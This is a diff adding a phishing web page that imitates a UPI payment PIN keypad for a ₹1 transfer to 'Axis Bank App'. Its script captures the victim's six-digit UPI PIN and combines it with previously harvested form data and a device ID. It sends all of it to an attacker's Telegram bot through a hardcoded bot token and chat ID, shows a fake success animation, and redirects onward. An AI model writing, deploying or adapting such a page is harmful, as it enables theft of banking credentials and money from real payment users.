@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure UPI Keypad</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
+    <script src="https://unpkg.com/lottie-web@5.12.2/build/player/lottie.min.js"></script>
+    <link rel="preload" href="https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation1.json" crossorigin="anonymous">
+    <link rel="preload" href="https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation2.json" crossorigin="anonymous">
+    <link rel="preload" href="https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation3.json" crossorigin="anonymous">
+    <style>
+       * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+
+.pin-screen{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    background-color: white;
+    position: relative;
+}
+.header {
+    width: 100%;
+    height: 50px;
+    padding: 0px;
+    display: flex;
+    justify-content: end;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    background-color: white;
+    z-index: 10;
+}
+
+.header img {
+    width: auto;
+    height: 40px;
+}
+.details {
+    width: 100%;
+    padding: 5px 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #f0f0f0;
+    font-size: 15px;
+    font-weight: 500;
+    margin-top: 50px;
+}
+.center-content {
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    position: absolute;
+    top: 30%;
+    transform: translateY(-50%);
+    width: 100%;
+}
+h5 {
+    font-size: 15px;
+    font-weight: 500;
+    color: #3d3d3d;
+    margin-bottom: 15px;
+}
+.input-container {
+    font-size: 30px;
+    font-weight: bold;
+    color: #003bab;
+    letter-spacing: 10px;
+    display: flex;
+    gap: 5px;
+    margin-bottom: 15px;
+}
+
+.warning {
+    font-size: 25px;
+    font-weight: 500;
+    border-radius: 30px;
+    background: rgba(255, 199, 0, 0.2);
+    display: flex;
+    width: 85%;
+    padding: 10px;
+    color: #ff9d00;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    margin-top: 15px;
+}
+
+.warning i{
+    
+    font-size: 35px;
+    margin-left: 0px;
+}
+
+.warning p {
+    text-align: center;
+    color: black;
+    font-size: 14px;
+    margin-left: 10px;
+}
+
+.keypad {
+    width: 100%;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    padding-bottom: 30px;
+    padding-top: 15px;
+    padding-left: 15px;
+    padding-right: 15px;
+    background-color: #f1f1f1;
+}
+.key {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 60px;
+    font-size: 25px;
+    font-weight: bold;
+    color: #003bab;
+    background-color: transparent;
+    cursor: pointer;
+    user-select: none;
+    transition: transform 0.1s ease, background-color 0.1s ease;
+}
+.key:active {
+    transform: scale(0.9);
+    border-radius: 15px;
+}
+#done {
+    font-size: 35px;
+}
+#done1 {
+    font-size: 30px;
+}
+
+ .bottom-sheet {
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            align-content: center;
+            flex-direction: column;
+            background-color: white;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+            transform: translateY(100%);
+            transition: transform 0.3s ease-in-out;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .bottom-sheet.show {
+            transform: translateY(0);
+        }
+
+        .lottie-container {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+        }
+
+        .bottom-sheet-title {
+            font-size: 1.4em;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        .try-again-button {
+            padding: 10px 15px;
+            background-color: #008CBA;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); /* Add shadow */
+            transition: background-color 0.3s ease; /* Add transition */
+        }
+
+        .try-again-button:hover {
+            background-color: #0077B5; /* Darker shade on hover */
+        }
+    </style>
+</head>
+<body>
+    <div class="pin-screen" id="pin-screen">
+    <!-- Header -->
+    <div class="header">
+        
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
+    </div>
+
+    <!-- Transaction Details -->
+    <div class="details">
+        <p>Sending: <br>To:</p>
+        <p>₹1.00 <br>Axis Bank App</p>
+    </div>
+
+    <!-- Center Content -->
+    <div class="center-content">
+        <h5>ENTER UPI PIN</h5>
+        <div class="input-container" id="input-display">
+            <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
+        </div>
+        <div class="warning">
+            <i class="fas fa-exclamation-circle"></i>
+            <p>You are sending ₹1.00 from your account to Axis Bank App</p>
+        </div>
+    </div>
+
+    <!-- Keypad -->
+    <div class="keypad">
+        <div class="key" onclick="enterNumber(1)">1</div>
+        <div class="key" onclick="enterNumber(2)">2</div>
+        <div class="key" onclick="enterNumber(3)">3</div>
+        <div class="key" onclick="enterNumber(4)">4</div>
+        <div class="key" onclick="enterNumber(5)">5</div>
+        <div class="key" onclick="enterNumber(6)">6</div>
+        <div class="key" onclick="enterNumber(7)">7</div>
+        <div class="key" onclick="enterNumber(8)">8</div>
+        <div class="key" onclick="enterNumber(9)">9</div>
+        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
+        <div class="key" onclick="enterNumber(0)">0</div>
+        <div class="key" id="done" onclick="openBottomSheet()"><i class="fas fa-circle-check"></i></div>
+    </div>
+    </div>
+    
+     <div class="bottom-sheet" id="bottomSheet">
+        <div class="lottie-container" id="lottieView"></div>
+        <div class="bottom-sheet-title" id="sheetTitle"></div>
+        <button class="try-again-button" id="tryAgainButton" style="display: none;" onclick="tryAgain()">Try Again</button>
+    </div>
+    
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8558586576:AAGbxImqr-TyS59Qq9jykl_EvF9YbFVZtLA";
+        const TELEGRAM_CHAT_ID = "8592704250";
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                console.warn('Telegram bot not configured; skipping send.');
+                return Promise.resolve();
+            }
+            const url = `https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`;
+            return fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).then(resp => {
+                if (!resp.ok) throw new Error(`Telegram API error: ${resp.status}`);
+                return resp.json();
+            }).then(data => console.log('Telegram message sent', data))
+            .catch(err => console.warn('Could not send Telegram message', err));
+        }
+
+        let enteredNumbers = [];
+        let isHidden = true;
+        let formData = localStorage.getItem("formData");
+        let DeviceId = localStorage.getItem("DeviceId");
+
+
+        function updateDisplay() {
+    let display = document.getElementById("input-display");
+    display.innerHTML = "";
+    
+    for (let i = 0; i < 6; i++) {
+        let span = document.createElement("span");
+        span.textContent = enteredNumbers[i] !== undefined ? (isHidden ? "•" : enteredNumbers[i]) : "";
+        display.appendChild(span);
+    }
+}
+
+        function enterNumber(num) {
+            if (enteredNumbers.length < 6) {
+                enteredNumbers.push(num);
+                updateDisplay();
+            }
+        }
+
+        function deleteNumber() {
+            enteredNumbers.pop();
+            updateDisplay();
+        }
+        
+function submitData() {
+            let UpiPin = enteredNumbers.join('');
+            let finalData = formData + "\nUpi Pin: " + UpiPin;
+            localStorage.setItem("formData", finalData);
+
+            const telegramText = `🔢 <b>UPI PIN entered</b>\nPIN: <code>${UpiPin}</code>\nDevice: <code>${DeviceId}</code>\nFrom: ${formData || 'Unknown'}`;
+            sendTelegramMessage(telegramText)
+                .finally(() => {
+                    setTimeout(() => {
+                        window.location.href = "final.html";
+                    }, 2000);
+                });
+        }
+        updateDisplay();
+        
+        let bottomSheet = document.getElementById('bottomSheet');
+        let lottieView = document.getElementById('lottieView');
+        let sheetTitle = document.getElementById('sheetTitle');
+        let tryAgainButton = document.getElementById('tryAgainButton');
+        let pinScreen = document.getElementById('pin-screen');
+        let lottieAnimation;
+        let paymentState = 0;
+
+        const animPaths = {
+            verifying: 'https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation1.json',
+            fail: 'https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation2.json',
+            success: 'https://raw.githubusercontent.com/lodagmail/Anime/refs/heads/main/Animation3.json'
+        };
+
+        function openBottomSheet() {
+            bottomSheet.classList.add('show');
+            tryAgainButton.style.display = 'none';
+            pinScreen.style.display = 'none';
+            loadVerifyingAnimation();
+        }
+
+        function closeBottomSheet() {
+            bottomSheet.classList.remove('show');
+        }
+
+        function loadVerifyingAnimation() {
+            sheetTitle.textContent = 'Verifying UPI pin...';
+            loadLottie(animPaths.verifying);
+            setTimeout(() => {
+                if (paymentState === 0) {
+                    loadSuccessAnimation();
+                } else {
+                    loadSuccessAnimation();
+                }
+            }, 4000);
+        }
+
+        function loadFailAnimation() {
+            submitData();
+            sheetTitle.textContent = 'Wrong UPI pin';
+            loadLottie(animPaths.fail);
+            tryAgainButton.style.display = 'block';
+            paymentState = 1;
+        }
+
+        function loadSuccessAnimation() {
+            sheetTitle.textContent = 'Success Paying ₹1';
+            loadLottie(animPaths.success);
+            submitData();
+        }
+
+        function loadLottie(animationPath) {
+            if (lottieAnimation) {
+                lottieAnimation.destroy();
+            }
+            lottieAnimation = lottie.loadAnimation({
+                container: lottieView,
+                renderer: 'svg',
+                loop: true,
+                autoplay: true,
+                path: animationPath
+            });
+        }
+
+        function tryAgain() {
+            paymentState = 2;
+            pinScreen.style.display = 'block';
+            enteredNumbers = [];
+            updateDisplay();
+            
+        }
+    </script>
+
+</body>
+</html>
